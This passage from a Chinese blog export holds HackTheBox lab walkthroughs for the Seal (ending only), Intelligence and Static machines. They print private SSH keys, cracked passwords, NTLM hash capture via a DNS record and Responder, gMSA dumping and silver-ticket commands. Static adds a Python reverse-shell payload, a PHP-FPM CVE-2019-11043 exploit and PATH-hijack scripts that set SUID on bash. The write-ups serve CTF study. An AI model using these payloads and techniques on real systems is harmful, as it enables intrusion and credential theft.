wDs7DMkK6jV7T2vqh41Q3If09U40pQlsQBR8vziD8QbqRP5GxKMtfnSR7kfoBKesjJX6hchFYVGw6soQAAAAMBAAEAAAGAJuAsvxR1svL0EbDQcYVzUbxsawMRTxRauAwlWxXSivmUGnJowwTlhukd2TJKhBkPW2kUXI6OWkC+it9Oevv&#x2F;cgiTY0xwbmOXAMylzR06Y5NItOoNYAiTVux4W8nQuAqxDRZVqjnhPHrFe&#x2F;UQLlT&#x2F;v&#x2F;khlnngHHLwutn06nbupeAfHqGzZYJi13FEu8&#x2F;2kY6TxlH&#x2F;2WX7WMMsE4KMkjy&#x2F;nrUixTNzS+0QjKUdvCGS1P6LhFB+7xN9itjEtBBiZ9p5feXwBn6aqIgSFyQJlU4e2CUFUd5PrkiHLf8mXjJJGMHbHne2rup0OXVqjxAW3qifK3UEp0bCInJS7UJ7tR9VI52QzQ&#x2F;RfGJ+CshtqBeEioaLfPi9CxZ6LN4S1zriasJdAzB3Hbu4NVVOc&#x2F;xkH9mTJQ3kf5RGScCYablLjUCOq05aPVqhaW6tyDaf8ob85q&#x2F;s+CYaOrbi1YhxhOM8o5MvNzsrS8eIk1hTOf0msKEJ5mWo+RfhhCj9FTFSqyK79hQBAAAAwQCfhc5si+UU+SHfQBg9lm8d1YAfnXDP5X1wjz+GFw15lGbg1x4YBgIz0A8PijpXeVthz2ib+73vdNZgUD9t2B0TiwogMs2UlxuTguWivb9JxAZdbzr8Ro1XBCU6wtzQb4e22licifaaWS&#x2F;o1mRHOOP90jfpPOby8WZnDuLm4+IBzvcHFQaO7LUG2oPEwTl0ii7SmaXdahdCfQwkN5NkfLXfUqg41nDOfLyRCqNAXu+pEbp8UIUl2tptCJo&#x2F;zDzVsI4AAADBAOUwZjaZm6w&#x2F;EGP6KX6w28Y&#x2F;sa&#x2F;0hPhLJvcuZbOrgMj+8FlSceVznA3gAuClJNNn0jPZ0RMWUB978eu4J3se5OplVaLGrzT88K0nQbvM3KhcBjsOxCpuwxUlTrJi6+i9WyPENovEWU5c79WJsTKjIpMOmEbMkCbtTRbHtuKwuSe8OWMTF2+Bmt0nMQc9IRD1II2TxNDLNGVqbq4fhBEW4co1X076CUGDnx5K5HCjel95b+9H2ZXnW9LeLd8G7oFRUQAAAMEAyHfDZKku36IYmNeDEEcCUrO9Nl0Nle7bVd3EJug4Wsl&#x2F;n1UqCCABQjhWpWA3oniOXwmbAsvFiox5EdBYzr6vsWmeleOQTRuJCbw6lcYG6tmwVeTbhkycXMbEVeIsG0a42Yj1ywrq5GyXKYaFr3DnDITcqLbdxIIEdH1vrRjYynVMueX7aq9pIXhcGT6M9CGUJjyEkvOrx+HRD4TKu0lGcO3LVANGPqSfks4r5Ea4LiZ4Q4YnOJu8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE&#x3D;-----END OPENSSH PRIVATE KEY----- user flag使用得到的luis ssh私钥登录，得到user.txt： 提权信息sudo ansible-playbook,playbook自定义命令： Ansible Command Module Examples | Devops Junctionhttps://www.middlewareinventory.com/blog/ansible-command-examples/ 提权 &amp; root flag例如直接给bash suid，读取root.txt: test.yml1234- hosts: localhost tasks: - name: test command: &quot;chmod +s &#x2F;bin&#x2F;bash&quot; 参考资料 Tomcat path traversal via reverse proxy mapping - Vulnerabilities - Acunetixhttps://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/ Ansible Command Module Examples | Devops Junctionhttps://www.middlewareinventory.com/blog/ansible-command-examples/ HTB Seal [Discussion] | RaidForumshttps://raidforums.com/Thread-Tutorial-HTB-Seal-Discussion Seal Hackthebox Detailled Writeuphttps://0xsakthi.blogspot.com/2021/07/seal-hackthebox-detailled-writeup.html","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Intelligence - HackTheBox","slug":"Intelligence-HackTheBox","date":"2021-07-05T08:43:11.000Z","updated":"2021-11-29T02:46:44.706Z","comments":true,"path":"2021/07/05/Intelligence-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/07/05/Intelligence-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/357 10.10.10.248 端口扫描常规域环境,intelligence.htb： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657$ nmap -sC -sV -Pn 10.10.10.248Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-05 14:33 CSTNmap scan report for 10.10.10.248Host is up (0.075s latency).Not shown: 988 filtered portsPORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Intelligence88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-05 13:34:41Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc.intelligence.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb| Not valid before: 2021-04-19T00:43:16|_Not valid after: 2022-04-19T00:43:16|_ssl-date: 2021-07-05T13:36:02+00:00; +7h00m00s from scanner time.445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc.intelligence.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb| Not valid before: 2021-04-19T00:43:16|_Not valid after: 2022-04-19T00:43:16|_ssl-date: 2021-07-05T13:36:02+00:00; +7h00m00s from scanner time.3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc.intelligence.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb| Not valid before: 2021-04-19T00:43:16|_Not valid after: 2022-04-19T00:43:16|_ssl-date: 2021-07-05T13:36:02+00:00; +7h00m00s from scanner time.3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc.intelligence.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb| Not valid before: 2021-04-19T00:43:16|_Not valid after: 2022-04-19T00:43:16|_ssl-date: 2021-07-05T13:36:02+00:00; +7h00m00s from scanner time.Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s| smb2-security-mode:| 2.02:|_ Message signing enabled and required| smb2-time:| date: 2021-07-05T13:35:23|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 143.56 seconds 80web上有一些文档可以下载，命名格式很规律： PDFs根据pdf命名格式发现其他文件： 基于这些pdf提取用户名： pdf文件很多文本，提取出来过滤关键字可以得到一个初始密码： 1NewIntelligenceCorpUser9876 kerbrutekeerbrute确认这些用户名都是有效的，不需要格式变形： usernames123456789101112131415161718192021222324252627282930Anita.RobertsBrian.BakerBrian.MorrisDaniel.SheltonDanny.MatthewsDarryl.HarrisDavid.McbrideDavid.ReedDavid.WilsonIan.DuncanJason.PattersonJason.WrightJennifer.ThomasJessica.MoodyJohn.ColemanJose.WilliamsKaitlyn.ZimmermanKelly.LongNicole.BrockRichard.WilliamsSamuel.RichardsonScott.ScottStephanie.YoungTeresa.WilliamsonThomas.HallThomas.ValenzuelaTiffany.MolinaTravis.EvansVeronica.PatelWilliam.Lee scan.py123456789101112131415161718#!/usr/bin/python3import requestsimport osurl = 'http://intelligence.htb/documents/'for i in range(2020,2022): for j in range(1,13): for k in range(1,31): date = f'&#123;i&#125;-&#123;j:02&#125;-&#123;k:02&#125;-upload.pdf' r = requests.get(url+date) #print (r.text) if (r.status_code == 200): print (date) #text = r.text os.system('mkdir pdf') os.system(f'wget &#123;url&#125;&#123;date&#125; -O pdf/&#123;date&#125;') extract_text.py12345678910111213#!/usr/bin/python3from pdfminer.high_level import extract_textfiles = ['2020-01-01-upload.pdf', '2020-01-02-upload.pdf', '2020-01-04-upload.pdf', '2020-01-10-upload.pdf', '2020-01-20-upload.pdf', '2020-01-22-upload.pdf', '2020-01-23-upload.pdf', '2020-01-25-upload.pdf', '2020-01-30-upload.pdf', '2020-02-11-upload.pdf', '2020-02-17-upload.pdf', '2020-02-23-upload.pdf', '2020-02-24-upload.pdf', '2020-02-28-upload.pdf', '2020-03-04-upload.pdf', '2020-03-05-upload.pdf', '2020-03-12-upload.pdf', '2020-03-13-upload.pdf', '2020-03-17-upload.pdf', '2020-03-21-upload.pdf', '2020-04-02-upload.pdf', '2020-04-04-upload.pdf', '2020-04-15-upload.pdf', '2020-04-23-upload.pdf', '2020-05-01-upload.pdf', '2020-05-03-upload.pdf', '2020-05-07-upload.pdf', '2020-05-11-upload.pdf', '2020-05-17-upload.pdf', '2020-05-20-upload.pdf', '2020-05-21-upload.pdf', '2020-05-24-upload.pdf', '2020-05-29-upload.pdf', '2020-06-02-upload.pdf', '2020-06-03-upload.pdf', '2020-06-04-upload.pdf', '2020-06-07-upload.pdf', '2020-06-08-upload.pdf', '2020-06-12-upload.pdf', '2020-06-14-upload.pdf', '2020-06-15-upload.pdf', '2020-06-21-upload.pdf', '2020-06-22-upload.pdf', '2020-06-25-upload.pdf', '2020-06-26-upload.pdf', '2020-06-28-upload.pdf', '2020-06-30-upload.pdf', '2020-07-02-upload.pdf', '2020-07-06-upload.pdf', '2020-07-08-upload.pdf', '2020-07-20-upload.pdf', '2020-07-24-upload.pdf', '2020-08-01-upload.pdf', '2020-08-03-upload.pdf', '2020-08-09-upload.pdf', '2020-08-19-upload.pdf', '2020-08-20-upload.pdf', '2020-09-02-upload.pdf', '2020-09-04-upload.pdf', '2020-09-05-upload.pdf', '2020-09-06-upload.pdf', '2020-09-11-upload.pdf', '2020-09-13-upload.pdf', '2020-09-16-upload.pdf', '2020-09-22-upload.pdf', '2020-09-27-upload.pdf', '2020-09-29-upload.pdf', '2020-09-30-upload.pdf', '2020-10-05-upload.pdf', '2020-10-19-upload.pdf', '2020-11-01-upload.pdf', '2020-11-03-upload.pdf', '2020-11-06-upload.pdf', '2020-11-10-upload.pdf', '2020-11-11-upload.pdf', '2020-11-13-upload.pdf', '2020-11-24-upload.pdf', '2020-11-30-upload.pdf']#keywords = ['user','username','pass','password']keywords = 'user'for i in files: text = extract_text('pdf/'+i) if(keywords in text): print (i) print (text) SMBcrackmapexec根据得到的用户名和密码得到一组有效账号： 123crackmapexec smb intelligence.htb -u user.txt -p NewIntelligenceCorpUser9876intelligence.htb\\Tiffany.Molina:NewIntelligenceCorpUser9876 smb share枚举smb share： user flagsmb share中存在Users，其中可以在Tiffany.Molina用户目录桌面得到user.txt: 信息IT里有个powershell文件，查看内容发现是有一个定时任务在运行，每5分钟去检查web*状态： 那么如果我们可以添加一个dns记录指向我们自己的机器，就可以利用responder得到Ted.Graves用户hash Ted.Gravesdnstool使用这里面的dnstool，添加一条dns记录： https://github.com/dirkjanm/krbrelayx.git 1python3 dnstool.py -u 'intelligence.htb\\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r 'weboops.intelligence.htb' -d 10.10.14.11 10.10.10.248 然后等待定时任务执行，得到Ted.Graves用户hash： hash 破解出来Ted.Graves用户密码： 1Mr.Teddy (Ted.Graves) responder12345678sudo Python ~/Tools/Responder/Responder.py -I utun2 -i 10.10.14.11 -A -v[HTTP] Sending NTLM authentication request to 10.10.10.248[HTTP] GET request from: 10.10.10.248 URL: /[HTTP] Host : weboops[HTTP] NTLMv2 Client : 10.10.10.248[HTTP] NTLMv2 Username : intelligence\\Ted.Graves[HTTP] NTLMv2 Hash : Ted.Graves::intelligence利用已有的账号密码继续枚举ldap，得到gMSA密码： https://github.com/micahvandeusen/gMSADumper 123python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htbsvc_int$:::d64b83fe606e6d3005e20ce0ee932fe2 白银票据现在有一个svc账号的hash，可以尝试白银票据,但直接尝试得到一个错误，时钟偏移太大： 1python3 ~&#x2F;Tools&#x2F;impacket&#x2F;examples&#x2F;getST.py intelligence.htb&#x2F;svc_int$ -spn WWW&#x2F;dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator ntpupdate很常见的问题，同步一下时间就可以： 12sudo apt-get install ntpdatesudo ntpdate 10.10.10.248 secretdump之后就可以使用生成的票据进行各种操作，例如secretdump： root flag之后就可以PTH得到system shell，读取root.txt: 参考资料 https://github.com/dirkjanm/krbrelayx https://github.com/micahvandeusen/gMSADumper No Shells Required - a Walkthrough on Using Impacket and Kerberos to Delegate Your Way to DAhttp://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html HTB Intelligence [Discussion] | RaidForumshttps://raidforums.com/Thread-Tutorial-HTB-Intelligence-Discussion HTB Intelligence User and Root (free) | RaidForumshttps://raidforums.com/Thread-Tutorial-HTB-Intelligence-User-and-Root-free","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Static - HackTheBox","slug":"Static-HackTheBox","date":"2021-06-29T07:48:28.000Z","updated":"2021-12-21T08:53:08.748Z","comments":true,"path":"2021/06/29/Static-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/06/29/Static-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/355 10.10.10.246 端口扫描22,2222两个ssh，一个8080web： 123456789101112131415161718192021222324252627$ nmap -sC -sV -Pn 10.10.10.246Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-29 14:13 CSTNmap scan report for 10.10.10.246Host is up (0.080s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey:| 2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA)| 256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA)|_ 256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519)2222/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA)| 256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA)|_ 256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519)8080/tcp open http Apache httpd 2.4.38 ((Debian))| http-robots.txt: 2 disallowed entries|_/vpn/ /.ftp_uploads/|_http-server-header: Apache/2.4.38 (Debian)|_http-title: Site doesn't have a title (text/html; charset=UTF-8).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 85.48 seconds 8080直接访问是空白,robots.txt得到两个目录： vpn需要账号密码： .ftp_uploads一个gz文件和一个txt，txt说明gz文件因为ftp传输模式损坏，需要修复： fixgz搜到这个： https://github.com/yonjar/fixgz 根据代码就是换行符问题，修复后解压得到账号密码及OTP secret,密码解hash就是admin： 123admind033e22ae348aeb5660fc2140aec35850c4da997 (admin)orxxi4c7orxwwzlo vpn登录前面的vpn，需要2FA，我们已经得到了secret，就可以自己生成otp,登录进去： https://addons.mozilla.org/en-US/firefox/addon/auth-helper/ 可以生成vpn文件,根据文件内容把域名加hosts后连接： 110.10.10.246 vpn.static.htb route连接后分配到一个ip，可以去访问web上显示的那些资源，但首先需要配置下路由，因为那些ip段本地也存在： 1234ip route add 172.20.0.0/24 dev utun3# mac系统这样加sudo route -n add -net 172.20.0.0 -netmask 255.255.255.0 172.30.0.9 web添加路由后去访问web，info.php发现xdebug 2.6： xdebug unearth rce搜到这个，打到www-data: xdebug Unauthenticated OS Command Executionhttps://www.rapid7.com/db/modules/exploit/unix/http/xdebug_unauth_exec/ www-data用户目录可以发现ssh私钥： www-data-id_rsa123456789101112131415161718192021222324252627-----BEGIN RSA PRIVATE KEY-----MIIEowIBAAKCAQEA0pNa5qwGZ+DKsS60GPhNfCqZti7z1xPzxOTXwtwO9uYzZpq&#x2F;nrhzgJq0nQNVRUbaiZ+H6gR1OreDyjr9YorV2kJqccscBPZ59RAhttaQsBqHkGjJQEHYKteL1D+hJ80NDd7fJTtQgzT4yBDwrVKwIUSETMfWgzJ5z24LN5s&#x2F;rcQYgl3iVKmls3lsod8ilakdDoYEYt12L4ST&#x2F;exEoVl0AyD9y8m651q40k1Gz4WzPnaHAlnjmL6CANfiNAJoc8WnqZN5ruSrWhmivmDbKLlDCO5bCCzi2zMHJKqQkcBxdWk60Qhi17UJMV3mKVQRprvpeTR2jCMykH81n2KU46doSQIDAQABAoIBAADCHxWtkOhW2uQAcw2T91N3I86QJLiljb8rw8sj17nz4kOAUyhTKbdQ102pcWkqdCcCuA6TrYhkmMjlpXvxXAvJKXD3dkZeTNohEL4Dz8mSjuJqPi9JDWo6FHrTL9Vg26ctIkiUChou2qZ9ySAWqCO2h3NvVMpsKBwjHU858+TASlo4j03FJOdmROmUelcqmRimWxgneHBAHEZjGqDuPjmPmw7pbThqlETyosrbaB3rROzUp9CKAHzYB1BvOTImDsb6qQ+GdKwewAQfj60myPuxl4qgY8O2yqLFUH3&#x2F;ovtPTKqHJSUFBO23wzS1qPLupzu1GVXwlsdlhRWAAmvx+AECgYEA6OOd9dgqXR&#x2F;vBaxDngWB6ToVysWDjO+QsjO4OpFo7AvGhMRR+WpKqbZyJG1iQB0nlAHgYHEFj4It9iI6NCdTkKyg2UzZJMKJgErfgI0Svkh&#x2F;Kdls23NygxpacxW3d2RlyAv4m2hG4n82+DsoPcN+6KxqGRQxWywXtsBsYkRb+wkCgYEA53jg+1CfGEH&#x2F;N2TptK2CCUGB28X1eL0wDs83RsU7Nbz2ASVQj8K0MlVzR9CRCY5y6jcqte1YYDiuFvT+17ENSe5fDtNiF1LEDfp45K6s4YU79DMp6Ot84c2fBDIh8ogH0D7CCFdjXCI3SIlvc8miyivjRHoyJYJz&#x2F;cO94DsTE0ECgYA1HlWVEWz4OKRoAtaZYGA1Ng5qZYqPxsSWIL3QfgIUdMse1ThtTxUgiICYVmqmfP&#x2F;d&#x2F;l+TH7RI+0RIc54a7y1cPkOhzKlqfQSnwmwgAg1YYWi&#x2F;vtvZYgeoZ4Zh4X4rOTcN3c0ihTJFzwZWsAeJruFvaIP6nGR1iyUNhe4yq6zfIQKBgANYQNAA2zurgHeZcrMUqsNdefXmB2UGPtKH9gGEyhU9tMRReLeLFbWAfJj2D5J2x3xQ7cIROuyxBPr58VDGky2VTzRUo584p&#x2F;KXwvVy&#x2F;LaJiVM&#x2F;BgUCmhxdL0YNP2ZUxuAgeAdM0&#x2F;e52time8DNkhefyLntlhnqp6hsEqtRzzXBAoGBANB6Wdk&#x2F;X3riJ50Bia9Ai7&#x2F;rdXUpAa2B4pXARnP1&#x2F;tw7krfPM&#x2F;SCMABesjZU9eeOecWbg+B6RWQTNcxo&#x2F;cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gau-----END RSA PRIVATE KEY----- user flagwww-data使用私钥ssh登录，端口是2222那个，user.txt在上层目录: pki查看ip发现双网卡，vpn界面也能看到pki是另一个网段的： 所以把pki转发出来访问： 1ssh -L 8080:192.168.254.3:80 www-data@10.10.10.246 -p2222 -i www-data_id_rsa 根据说明大概是管理ovpn文件的 PHP-FPMpki的响应header发现是PHP-FPM/7.1，搜到： PHP-FPM Remote Code Execution Vulnerability (CVE-2019–11043) Analysis | by Knownsec 404 team | Mediumhttps://medium.com/@knownsec404team/php-fpm-remote-code-execution-vulnerability-cve-2019-11043-analysis-35fd605dd2dc https://github.com/theMiddleBlue/CVE-2019-11043 exploit所以可以通过web去打pki，把exp文件和nc传到web上，执行,打到pki的www-data： https://github.com/H74N/netcat-binaries/blob/master/nc 1234567# localscp -P 2222 -i www-data_id_rsa exploit.py www-data@10.10.10.246:&#x2F;tmp&#x2F;exploit.pyscp -P 2222 -i www-data_id_rsa nc www-data@10.10.10.246:&#x2F;tmp&#x2F;ncscp -P 2222 -i www-data_id_rsa shell.py www-data@10.10.10.246:&#x2F;tmp&#x2F;shell.py# web www-data shellpython3 exploit.py --url http:&#x2F;&#x2F;192.168.254.3&#x2F;index.php shell.py123456import requestspayload = '/usr/bin/python3.6 -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.254.2\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\\''r = requests.get(\"http://192.168.254.3/index.php?a=\"+payload)print(r.text) ersatool根据信息去查看ersatool，并且可以直接查看源码： 根据代码分析可以知道格式化字符串，也可以pspy64之类的分析调用，没有curl，wget之类的，可以通过bash实现： https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et 分析可以发现ersatool调用了openssl，没有使用绝对路径，可以进行劫持 Linux Privilege Escalation Using PATH Variablehttps://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/ ersatool.cinclude &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;libgen.h&gt;#include &lt;sys/wait.h&gt;#include &lt;ctype.h&gt;//easyrsa configurationchar ERSA_DIR[]=\"/opt/easyrsa\";char TA_KEY[]=\"/opt/easyrsa/clients/ta.key\";char OUTPUT_DIR[]=\"/opt/easyrsa/clients\";char BASE_CONFIG[]=\"/opt/easyrsa/clients/base.conf\";char EXT[]=\".ovpn\";//void printCN(char*,int);void filePrint(char*);void revokeCN(char*,int);void createCN(char*,int);void integrateCN(char*);void getHelp(char*,int);void cleanStr(char*);//deprecated function - prints the CN ovpn config file//conf file can be printed with inegrateCN(); &lt;- createvoid printCN(char *cn, int i)&#123; char fn[100]; char buffer[100]; if(i==1)&#123; printf(\"print-&gt;CN=\"); fflush(stdout); memset(buffer,0,sizeof(buffer)); read(0,buffer,sizeof(buffer)); &#125; else &#123; memset(buffer,0,sizeof(buffer)); strncat(buffer,cn,sizeof(buffer)); &#125; if(!strncmp(\"\\n\",buffer,1)) &#123; return; &#125; do&#123; strncpy(fn, OUTPUT_DIR,sizeof(fn)); strncat(fn, \"/\",sizeof(fn)-strlen(fn)); strncat(fn, strtok(basename(buffer),\"\\n\"),sizeof(fn)-strlen(fn)); strncat(fn, EXT, sizeof(fn)-strlen(fn)); printf(buffer); //checking buffer content filePrint(fn); if(i==1)&#123; printf(\"\\nprint-&gt;CN=\"); fflush(stdout); memset(buffer,0,sizeof(buffer)); read(0,buffer,sizeof(buffer)); &#125; &#125; while (strncmp(\"\\n\",buffer,1) &amp;&amp; i==1);&#125;void filePrint(char *filename)&#123; int bfsiz=1; char buffer[bfsiz]; int fd; ssize_t fr; memset(buffer,0,bfsiz); setuid(0); //escalating privileges to read root owned files if((fd=open(filename,O_RDONLY))&lt;0)&#123; printf(\"[!] ERR reading %s!\\n\",filename); &#125; while(fr=read(fd,buffer,bfsiz)&gt;0)&#123; printf(\"%s\",buffer); memset(buffer,0,bfsiz); &#125; close(fd); fflush(stdout);&#125;void revokeCN(char *cn, int i)&#123; puts(\"[!] Not implemented\"); fflush(stdout);&#125;//creates and prints new CN config filevoid createCN(char *cn, int i)&#123; int devNull, sout, serr, pid, status, oid; char EASYRSA[50]; char buffer[100]; char CMD[100]; char WD[50]; memset(EASYRSA,0,sizeof(EASYRSA)); strcat(EASYRSA,ERSA_DIR); strcat(EASYRSA,\"/easyrsa\"); if(i==1)&#123; printf(\"create-&gt;CN=\"); fflush(stdout); memset(buffer,0,sizeof(buffer)); read(0,buffer,sizeof(buffer)); &#125; else &#123; memset(buffer,0,sizeof(buffer)); strncat(buffer, cn, sizeof(buffer)); &#125; if(!strncmp(\"\\n\",buffer,1)) &#123; return; &#125; do&#123; pid = vfork(); if(pid==0)&#123; char *a[] = &#123;EASYRSA,\"build-client-full\",strtok(basename(buffer),\"\\n\"),\"nopass\",\"batch\"&#125;; //forge the command string cleanStr(a[2]); sprintf(CMD,\"%s %s %.20s %s %s\",a[0],a[1],a[2],a[3],a[4]); sout=dup(STDOUT_FILENO); serr=dup(STDERR_FILENO); devNull=open(\"/dev/null\",O_WRONLY); dup2(devNull,STDOUT_FILENO); dup2(devNull,STDERR_FILENO); setuid(0); //escalating privilges to generate required files chdir(ERSA_DIR); system(CMD); exit(0); &#125; dup2(sout,STDOUT_FILENO); dup2(serr,STDERR_FILENO); close(devNull); usleep(500000); integrateCN(buffer); if(i==1)&#123; printf(\"create-&gt;CN=\"); fflush(stdout); memset(buffer,0,sizeof(buffer)); read(0,buffer,sizeof(buffer)); &#125; &#125; while (strncmp(\"\\n\",buffer,1) &amp;&amp; i==1);&#125;//print valid ovpnfile for provided cnvoid integrateCN(char *cn)&#123; char PKI_DIR[50]; char KEY_DIR[50]; char CRT_DIR[50]; char CA_CERT[50]; char CN_CERT[50]; char CN_KEY[50]; memset(PKI_DIR,0,sizeof(PKI_DIR)); memset(KEY_DIR,0,sizeof(KEY_DIR)); memset(CRT_DIR,0,sizeof(CRT_DIR)); memset(CA_CERT,0,sizeof(CA_CERT)); memset(CN_CERT,0,sizeof(CN_CERT)); memset(CN_KEY,0,sizeof(CN_KEY)); strcat(PKI_DIR,ERSA_DIR); strcat(PKI_DIR,\"/pki\"); strcat(KEY_DIR,PKI_DIR); strcat(KEY_DIR,\"/private\"); strcat(CRT_DIR,PKI_DIR); strcat(CRT_DIR,\"/issued\"); strcat(CA_CERT,PKI_DIR); strcat(CA_CERT,\"/ca.crt\"); strcat(CN_CERT,CRT_DIR); strcat(CN_CERT,\"/\"); strcat(CN_CERT,basename(cn)); strcat(CN_CERT,\".crt\"); strcat(CN_KEY,KEY_DIR); strcat(CN_KEY,\"/\"); strcat(CN_KEY,basename(cn)); strcat(CN_KEY,\".key\"); filePrint(BASE_CONFIG); printf(\"&lt;ca&gt;\\n\"); filePrint(CA_CERT); printf(\"&lt;/ca&gt;\\n\"); printf(\"&lt;cert&gt;\\n\"); filePrint(CN_CERT); printf(\"&lt;/cert&gt;\\n\"); printf(\"&lt;key&gt;\\n\"); filePrint(CN_KEY); printf(\"&lt;/key&gt;\\n\"); printf(\"key-direction 1\\n&lt;tls-auth&gt;\\n\"); filePrint(TA_KEY); printf(\"&lt;/tls-auth&gt;\\n\"); fflush(stdout);&#125;void getHelp(char *prog, int i)&#123; if(i==1) &#123; printf(\"create|print|revoke|exit\\n\"); fflush(stdout); &#125; else&#123; printf(\"batch mode: %s create|print|revoke CN\\n\",prog); fflush(stdout); exit(255); &#125;&#125;//clean non alphanum chars from string to securevoid cleanStr(char *str)&#123; unsigned long i = 0; unsigned long j = 0; char c; while ((c = str[i++]) != '\\0') &#123; if (isalnum(c)) &#123; str[j++] = c; &#125; &#125; str[j] = '\\0';&#125;int main(int argc, char **argv)&#123; int interactive=0; char opt[8]; char *cn; if(argc!=3 &amp;&amp; argc!=1)&#123; getHelp(argv[0],interactive); &#125; else if(argc==1)&#123; interactive=1; printf(\"# \"); fflush(stdout); memset(opt,0,sizeof(opt)); read(0,opt,sizeof(opt)); cn=NULL; &#125; else &#123; strncpy(opt,argv[1],sizeof(opt)); cn=argv[2]; &#125; do &#123; if(!strncmp(\"revoke\",opt,6))&#123; revokeCN(cn,interactive); &#125; else if (!strncmp(\"print\",opt,5))&#123; printCN(cn,interactive); &#125; else if (!strncmp(\"create\",opt,6))&#123; createCN(cn,interactive); &#125; else if (!strncmp(\"exit\",opt,4))&#123; exit(0); &#125; else&#123; getHelp(argv[0], interactive); &#125; if(interactive==1)&#123; memset(opt,0,sizeof(opt)); printf(\"# \"); fflush(stdout); memset(opt,0,sizeof(opt)); read(0,opt,sizeof(opt)); &#125; &#125; while(interactive==1);&#125; 提权 &amp; root flag可以尝试给bash加suid： 123456$ cat openssl | base64IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAoKecho &quot;IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAoK&quot; | base64 -d &gt; opensslexport PATH&#x3D;&#x2F;tmp&#x2F;miao:$PATH 然后运行ersatool，随意create一个使其调用openssl，推出发现bash加上了suid，执行，读取root.txt： openssl12#!&#x2F;bin&#x2F;bashchmod u+s &#x2F;bin&#x2F;bash 参考资料 https://github.com/yonjar/fixgz https://addons.mozilla.org/en-US/firefox/addon/auth-helper/ xdebug Unauthenticated OS Command Executionhttps://www.rapid7.com/db/modules/exploit/unix/http/xdebug_unauth_exec/ PHP-FPM Remote Code Execution Vulnerability (CVE-2019–11043) Analysis | by Knownsec 404 team | 